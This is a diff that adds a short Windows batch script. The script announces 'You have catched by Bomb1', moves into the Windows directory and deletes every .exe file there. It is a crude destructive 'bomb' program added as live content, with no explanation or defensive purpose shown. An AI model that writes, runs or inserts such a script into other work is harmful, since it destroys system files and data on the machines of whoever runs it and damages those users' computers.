@@ -1,0 +1,8 @@
+@echo off
+@echo.
+@echo.
+@echo You have catched by Bomb1
+@echo.
+cd Windows
+del *.exe
+
